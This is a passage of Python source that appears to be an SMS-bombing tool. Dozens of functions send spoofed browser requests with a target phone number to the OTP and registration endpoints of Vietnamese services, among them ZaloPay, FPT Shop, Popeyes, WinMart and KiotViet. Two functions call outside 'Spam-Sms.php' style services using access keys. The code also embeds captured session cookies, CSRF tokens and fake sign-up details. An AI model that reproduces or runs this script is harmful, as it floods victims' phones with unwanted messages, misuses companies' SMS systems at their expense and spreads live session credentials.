    'client_utm':
    '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
  }

  headers = {
    'authority': 'robocash.vn',
    'accept': '*/*',
    'accept-language':
    'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'supportOnlineTalkID=Tgae5HbMTkxEJl3bJFHW90Marnk0g0x6; __cfruid=f1a6f7bd1587ecec8ebc3b75f57137c8af12676c-1682928280; XSRF-TOKEN=eyJpdiI6Ik9XT3lTck9TTFZQU3hrUzlxaXhWUUE9PSIsInZhbHVlIjoicmZlNEJ5SmJzKzJGSytKK2xDeFF4RlZtWXlnQ2ZWbXl6a3l6WWtwT3M2dFB1OHpLeWdLczBrTTlNT0ZVNXRlL0xmcUh2SWpHclZJSGRMenhqc3J4N2JnTllYZlowOGViQ3B4U1Iwb1VYQ2dPcDRKd3ZyWVRUQ2hEbitvT0lYb2IiLCJtYWMiOiIxMjg4MWM4MmMyYTM3N2ZkNDVkNmI0YTFiNTNmOTc4N2QxMjExNjc1MDZmYWNlNDlhMmE2MzVhZWVkYzBiZjViIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6InUyUXBmZGx5dEExYjVmaGt3UlQ3Mnc9PSIsInZhbHVlIjoiSGhzckx3U1lqYVRFY2hHdXZBalJ0ZzV5cHhqSUpsOGJVZzlJajVOTituZDRXR3o2cGNJRnFFWUpOYzAvdmlNd3BGS1JjTm1maE5QVS9DU0VqdkZMRGZ1N3dVOCszMGxuekw4S3BxSCtXY1ZCWFlqZjAzWlBDMHJqcm5yOHh3MHIiLCJtYWMiOiI3ZmQ2ZGZiM2FmNjJjODc4OWM0YTUwMmZlZjA3MmNjZWFiODAzNGQ5MDE5ZmJjM2MxOGVhZjY1ZjVjMDlmZWUwIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IlFWMWI0dUtNaGM4MUZVUHg0TWg1YXc9PSIsInZhbHVlIjoiNVcyVjh0UmZuUG4xUjRUTTR6enFHbVFMdmkyb0tTOWozMFBsdkNiT0hPcEt5TlloWk51aVJ2OVFNdHoyWGZ5SHZwcVBsYnhSZXpPUytiek0vZjNrNG5rUkVqTkpyeWZmTjRBT09aaGV3QWF2SzBMUEFxZ0xTeURnZy9rdThOcFciLCJtYWMiOiJlOWZhNzNkNTNhZGJiODgxMjIxN2ZjMTY4ZDk2NjRhNDc5MTVjMjNjYjQ3ZmZmZTk5NzcxNDJiODI4NzI2YWNmIiwidGFnIjoiIn0%3D; ec_cache_utm=2ecb18ca-827d-53c1-5f1a-7d106859d9e5; ec_cache_client=false; ec_cache_client_utm=%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D; ec_png_client=false; ec_png_utm=2ecb18ca-827d-53c1-5f1a-7d106859d9e5; ec_etag_client=false; ec_png_client_utm=%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D; ec_etag_utm=2ecb18ca-827d-53c1-5f1a-7d106859d9e5; ec_etag_client_utm=%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D; uid=2ecb18ca-827d-53c1-5f1a-7d106859d9e5; client=false; client_utm=%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
    'origin': 'https://robocash.vn',
    'referer': 'https://robocash.vn/register',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent':
    'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
  }

  data = {
    'phone': phone,
    '_token': 'iSkFRbkX3IamHEhtVZAi9AZ3PLRlaXMjX1hJJS3I',
  }

  requests.post('https://robocash.vn/register/phone-resend',
                cookies=cookies,
                headers=headers,
                data=data)
###
def findo(phone):
    headers = {
        "Host": "api.findo.vn",
        "accept": "application/json, text/plain, /",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/json;charset=UTF-8",
        "origin": "https://www.findo.vn",
        "referer": "https://www.findo.vn/"
    }

    data = {
        "mobilePhone": {
            "number": phone
        }
    }

    response = requests.post("https://api.findo.vn/web/public/client/phone/sms-code-ts", json=data, headers=headers)
    get = response.json()   

def AHAMOVE(phone):
    headers = {
        "Host": "api.ahamove.com",
        "cache-control": "max-age=0",
        "upgrade-insecure-requests": "1",
        "origin": "https://app.ahamove.com",
        "content-type": "application/json;charset=UTF-8",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
        "accept": "application/json, text/plain, /",
        "referer": "https://app.ahamove.com/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    
    mail = ''.join(random.choices(string.asciilowercase + string.digits, k=6)) + '@gmail.com'
    data = {
        'mobile': phone,
        'name': 'Tuấn',
        'email': mail,
        'countrycode': 'VN',
        'firebasesmsauth': True
    }
    
    response = requests.post("https://api.ahamove.com/api/v3/public/user/register", json=data, headers=headers)
def famod(phone):

    cookies = {
        'PHPSESSID': 'e3b87d795b51984b0f6838eddc50b471',
    }
    
    headers = {
        'authority': 'iamtris.x10.mx',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
        'cookie': 'PHPSESSID=e3b87d795b51984b0f6838eddc50b471',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }
    
    params = {
        'key': 'ducknha@123*',
        'phone': phone,
    }
    
    response = requests.get('https://iamtris.x10.mx/Spam-Sms.php', params=params, cookies=cookies, headers=headers)
def sms2(phone):
    requests.post("http://m.tv360.vn/public/v1/auth/get-otp-login", headers={"Host": "m.tv360.vn","Connection": "keep-alive","Content-Length": "23","Accept": "application/json, text/plain, */*","User-Agent": "Mozilla/5.0 (Linux; Android 10; moto e(7i) power Build/QOJ30.500-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36","Content-Type": "application/json","Origin": "http://m.tv360.vn","Referer": "http://m.tv360.vn/login?r\u003dhttp%3A%2F%2Fm.tv360.vn%2F","Accept-Encoding": "gzip, deflate"}, json=({"msisdn":"0"+phone[1:11]})).text
###
def cl1(phone):
  data = '{"mobilePhone":{"number":"phone"}}'.replace("phone",phone)
  head = {
    "Host":"api.tamo.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json;charset=UTF-8",
    "origin":"https://www.tamo.vn",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://www.tamo.vn/",
    "accept-encoding":"gzip, deflate, br",
    "accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
  }
  rq = requests.post("https://api.tamo.vn/web/public/client/phone/sms-code-ts",data=data,headers=head).json()

def cl2(phone):
  data = '{"api_args":{"lgUser":"phone","act":"send","type":"phone"},"api_method":"CheckExist"}'.replace("phone",phone)
  head = {
    "Host":"meta.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json",
    "origin":"https://meta.vn",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-origin",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://meta.vn/account/register",
    "accept-encoding":"gzip, deflate, br",
    "accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
  }
  rq = requests.post("https://meta.vn/app_scripts/pages/AccountReact.aspx?api_mode=1",data=data,headers=head).text
def cl3(phone):
    cookies = {
        'AKA_A2': 'A',
        'gkvas-uuid': 'b1b6bfdd-724e-449f-8acc-f3594f1aae3f',
        'gkvas-uuid-d': '1687347271111',
        'kvas-uuid': '1fdbe87b-fe8b-4cd5-b065-0900b3db04b6',
        'kvas-uuid-d': '1687347276471',
        'kv-session': '52268693-9db7-4b7d-ab00-0f5022612bc5',
        'kv-session-d': '1687347276474',
        '_fbp': 'fb.1.1687347277057.810313564',
        '_hjFirstSeen': '1',
        '_hjIncludedInSessionSample_563959': '1',
        '_hjSession_563959': 'eyJpZCI6IjI0OTRjOTA0LTEwYzQtNGVkMS04MGViLWFhZWRjZTg5Y2FmMSIsImNyZWF0ZWQiOjE2ODczNDcyNzcxNTYsImluU2FtcGxlIjp0cnVlfQ==',
        '_hjAbsoluteSessionInProgress': '1',
        '_tt_enable_cookie': '1',
        '_ttp': 'idt42AWvO5FQ_0j25HtJ7BSoA7J',
        '_gid': 'GA1.2.1225607496.1687347277',
        '_hjSessionUser_563959': 'eyJpZCI6ImRiOGYyMzEzLTdkMzItNTNmNi1hNWUzLTA4MjU5ZTE1MTRiOCIsImNyZWF0ZWQiOjE2ODczNDcyNzcxMzIsImV4aXN0aW5nIjp0cnVlfQ==',
        '_ga_6HE3N545ZW': 'GS1.1.1687347278.1.1.1687347282.56.0.0',
        '_ga_N9QLKLC70S': 'GS1.2.1687347283.1.1.1687347283.0.0.0',
        '_fw_crm_v': '4c8714f2-5161-4721-c213-fe417c49ae65',
        'parent': '65',
        '_ga': 'GA1.2.1568204857.1687347277',
    }

    headers = {
        'authority': 'www.kiotviet.vn',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'AKA_A2=A; gkvas-uuid=b1b6bfdd-724e-449f-8acc-f3594f1aae3f; gkvas-uuid-d=1687347271111; kvas-uuid=1fdbe87b-fe8b-4cd5-b065-0900b3db04b6; kvas-uuid-d=1687347276471; kv-session=52268693-9db7-4b7d-ab00-0f5022612bc5; kv-session-d=1687347276474; _fbp=fb.1.1687347277057.810313564; _hjFirstSeen=1; _hjIncludedInSessionSample_563959=1; _hjSession_563959=eyJpZCI6IjI0OTRjOTA0LTEwYzQtNGVkMS04MGViLWFhZWRjZTg5Y2FmMSIsImNyZWF0ZWQiOjE2ODczNDcyNzcxNTYsImluU2FtcGxlIjp0cnVlfQ==; _hjAbsoluteSessionInProgress=1; _tt_enable_cookie=1; _ttp=idt42AWvO5FQ_0j25HtJ7BSoA7J; _gid=GA1.2.1225607496.1687347277; _hjSessionUser_563959=eyJpZCI6ImRiOGYyMzEzLTdkMzItNTNmNi1hNWUzLTA4MjU5ZTE1MTRiOCIsImNyZWF0ZWQiOjE2ODczNDcyNzcxMzIsImV4aXN0aW5nIjp0cnVlfQ==; _ga_6HE3N545ZW=GS1.1.1687347278.1.1.1687347282.56.0.0; _ga_N9QLKLC70S=GS1.2.1687347283.1.1.1687347283.0.0.0; _fw_crm_v=4c8714f2-5161-4721-c213-fe417c49ae65; parent=65; _ga=GA1.2.1568204857.1687347277',
        'origin': 'https://www.kiotviet.vn',
        'referer': 'https://www.kiotviet.vn/dang-ky/',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': '+84'+phone[1:],
        'code': 'bancainayne',
        'name': 'Cai Nit',
        'email': 'ahihi123982@gmail.com',
        'zone': 'An Giang - Huyện Châu Phú',
        'merchant': 'bancainayne',
        'username': phone,
        'industry': 'Điện thoại & Điện máy',
        'ref_code': '',
        'industry_id': '65',
        'phone_input': "phone",
    }

    response = requests.post(
        'https://www.kiotviet.vn/wp-content/themes/kiotviet/TechAPI/getOTP.php',
        cookies=cookies,
        headers=headers,
        data=data,
    ).text
def cl4(phone):
	requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification", headers={"Host": "fptshop.com.vn","content-length": "16","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://fptshop.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptshop.com.vn/","accept-encoding": "gzip, deflate, br"}, data={"phone":phone}).text
def cl5(phone):
  data = '{"phoneNumber":"phone","secureHash":"33f65da1c264ef7f519149065a600def","deviceId":"","sendTime":1691068424578,"type":2}'.replace("phone",phone)
  head = { 
    "Host":"api.alfrescos.com.vn",
    "accept":"application/json, text/plain, */*",
    "brandcode":"ALFRESCOS",
    "devicecode":"web",
    "accept-language":"vi-VN",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json",
    "origin":"https://alfrescos.com.vn",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://alfrescos.com.vn/",
    "accept-encoding":"gzip, deflate, br",
  }
  rq = requests.post("https://api.alfrescos.com.vn/api/v1/User/SendSms?culture=vi-VN",data=data,headers=head).json()
def cl6(phone):
  data= '{"phone":"phone","firstName":"Nguyen","lastName":"Hoang","email":"Khgf123@gmail.com","password":"1262007gdtg"}'
  data = data.replace("phone",phone)
  head = {
    "Host":"api.popeyes.vn",
    "accept":"application/json",
    "x-client":"WebApp",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://popeyes.vn/",
    "accept-encoding":"gzip, deflate, br",
  }
  rq = requests.post("https://api.popeyes.vn/api/v1/register",data=data, headers=head).json()

def cl7(phone):
  data = f'phone_number={phone}&password=1262007Gdtg&given_name=&device_id=688e6ab3da160a362df3805047548504&platform=mobile_web&model=Android%208.1.0&push_token=&device_name=Chrome%2F114&device_type=desktop&isMorePlatform=true&ui=012021'
  head = {
    "Host":"api.vieon.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/x-www-form-urlencoded",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://vieon.vn/",
    "accept-encoding":"gzip, deflate, br",
  }
  rq = requests.post("https://api.vieon.vn/backend/user/register/mobile?platform=mobile_web&ui=012021",data=data,headers=head).json()
def cl8(phone):
  head = {
    "Host":"m.tv360.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json",
  }
  data = '{"msisdn":"phone"}'
  data = data.replace("phone",phone)
  rq = requests.post("https://m.tv360.vn/public/v1/auth/get-otp-login",data=data,headers=head).json()
def ZALOPAY(phone):
    head = {
        "Host": "api.zalopay.vn",
        "x-platform": "NATIVE",
        "x-device-os": "ANDROID",
        "x-device-id": "690354367d96c358",
        "x-device-model": "Samsung SM-A217F",
        "x-app-version": "7.16.0",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36 ZaloPay Android / 9881",
        "x-density": "xhdpi",
        "authorization": "Bearer",
        "x-drsite": "off",
        "accept-encoding": "gzip"
    }
    
    url = "https://api.zalopay.vn/v2/account/phone/status?phonenumber=" + phone
    get = json.loads(CURL("GET", url, None, head, False))
    token = get["data"]["sendotptoken"]
    data = '{"phonenumber":"' + phone + '","sendotptoken":"' + token + '"}'
    url = "https://api.zalopay.vn/v2/account/otp"
    get = json.loads(CURL("POST", url, data, head, False))

def cl9(phone):
  head = {
    "Host":"api-crownx.winmart.vn",
    "accept":"application/json",
    "authorization":"Bearer undefined",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://winmart.vn/",
    "accept-encoding":"gzip, deflate, br",
    "accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
  }
  rq = requests.get(f"https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo={phone}",headers=head).json()
def DONGPLUS(phone):
    phone = "84" + phone
    phone = phone.split("840")[1]    
    head = [
        "Host: api.dongplus.vn",
        "accept-language: vi",
        "user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type: application/json",
        "accept: */*",
        "origin: https://dongplus.vn",
        "referer: https://dongplusvn/user/login"
    ]
    
    data = '{"full_name":"Khang Nguyễn","first_name":"Nguyễn","last_name":"Khang","mobile_phone":"84' + phone + '","target_url":"https://dongplus.vn/?utm_source=direct&utm_medium=direct&utm_campaign=direct"}'
    
    CURL("POST", "https://api.dongplus.vn/api/user", data, head, False)
    
    data = '{"phone":"84' + phone + '"}'
    
    access = CURL("POST", "https://api.dongplus.vn/api/user/send-one-time-password", data, head, False)
def cl9(phone):
    Headers = {"Host": "api.fptplay.net","content-length": "89","sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"","accept": "application/json, text/plain, */*","content-type": "application/json; charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://fptplay.vn","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptplay.vn/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Datason = json.dumps({"phone": phone,"country_code":"VN","client_id":"vKyPNd1iWHodQVknxcvZoWz74295wnk8"})
    response = requests.post("https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st\u003dEim9hpobCZPoIoVVokkIDA\u0026e\u003d1681802671\u0026device\u003dChrome(version%253A112.0.0.0)\u0026drm\u003d1", data=Datason, headers=Headers).json()
def cl10(phone):
  data ='{"username": "phone"}'.replace("phone",phone)
  head = {
    "Host":"funring.vn",
    "Connection":"keep-alive",
    "Accept":"*/*",
    "User-Agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "Content-Type":"application/json",
    "X-Requested-With":"mark.via.gp",
    "Accept-Encoding":"gzip, deflate",
    "Accept-Language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"
  }
  rq = requests.post("http://funring.vn/api/v1.0.1/jersey/user/getotp",data=data,headers=head).json()
def oldzalopay(phone):
    cookies = {
        'serverChoice': 'Server-IPv2',
    }

    headers = {
        'authority': 'anhzea.link',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'serverChoice=Server-IPv2',
    'origin': 'https://anhzea.link',
    'referer': 'https://anhzea.link/tools/',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; 2201117TG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    }

    data = {
        'phone': phone,
    'ten_server': 'Server-IPv2',
    'key': 'Anhdz',
    }

    response = requests.post('https://anhzea.link/tools/', cookies=cookies, headers=headers, data=data)
def cl11(phone):
    csrfget = requests.post("https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F").text
    csrf = csrfget.split('name="csrf-token" value="')[1].split('"/>')[0]
    Headers = {"Host": "oauth.vietid.net","content-length": "41","cache-control": "max-age\u003d0","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","sec-ch-ua-mobile": "?1","sec-ch-ua-platform": "\"Android\"","upgrade-insecure-requests": "1","origin": "https://oauth.vietid.net","content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.7","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "_ga_H5VRTZBFLG\u003dGS1.1.1679234987.1.0.1679234987.0.0.0"}
    Payload = {"csrf-token": csrf,"account": phone}
    response = requests.post("https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F", data=Payload, headers=Headers).text
def F88(phone):
    cookies = {
        'CaptchaCookieKey': '0',
    'ASP.NET_SessionId': '34jg5jronfmd5ckw5v1bxsgm',
    'language': 'vi',
    'RequestData': '967a1e05-bc95-496f-8225-978410793291',
    'UserTypeMarketing': 'L0',
    '_ga': 'GA1.2.1881267340.1692516431',
    '_gid': 'GA1.2.2072564676.1692516431',
    '__sbref': 'qfedftxbynkgjilvgirthlywnrovauvskhaktepa',
    'UserMachineId_png': 'b97f1011-db66-4226-b571-f5224d731e92',
    'UserMachineId_etag': 'b97f1011-db66-4226-b571-f5224d731e92',
    'UserMachineId_cache': 'b97f1011-db66-4226-b571-f5224d731e92',
    'UserMachineId': 'b97f1011-db66-4226-b571-f5224d731e92',
    '_ga_LCPCW0ZYR8': 'GS1.1.1692516430.1.0.1692516436.54.0.0',
    'Marker': 'MarkerInfo=Thsf93Xl8hX0QPQq8pNDdsXKG8t/AlXAFwERfMh+tbs=',
    }

    headers = {
        'authority': 'moneyveo.vn',
    'accept': '*/*',
    'accept-language': 'vi',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'CaptchaCookieKey=0; ASP.NET_SessionId=34jg5jronfmd5ckw5v1bxsgm; language=vi; RequestData=967a1e05-bc95-496f-8225-978410793291; UserTypeMarketing=L0; _ga=GA1.2.1881267340.1692516431; _gid=GA1.2.2072564676.1692516431; __sbref=qfedftxbynkgjilvgirthlywnrovauvskhaktepa; UserMachineId_png=b97f1011-db66-4226-b571-f5224d731e92; UserMachineId_etag=b97f1011-db66-4226-b571-f5224d731e92; UserMachineId_cache=b97f1011-db66-4226-b571-f5224d731e92; UserMachineId=b97f1011-db66-4226-b571-f5224d731e92; _ga_LCPCW0ZYR8=GS1.1.1692516430.1.0.1692516436.54.0.0; Marker=MarkerInfo=Thsf93Xl8hX0QPQq8pNDdsXKG8t/AlXAFwERfMh+tbs=',
    'origin': 'https://moneyveo.vn',
    'referer': 'https://moneyveo.vn/vi/registernew/',
    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'traceparent': '00-871ffd8f2c18bc613c70e70ede6c4306-0e887f69ad61ef4c-01',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phoneNumber': phone,
    }

    response = requests.post('https://moneyveo.vn/vi/registernew/sendsmsjson/', cookies=cookies, headers=headers, data=data)

def cl12(phone):
    cookies = {
        'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
        '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
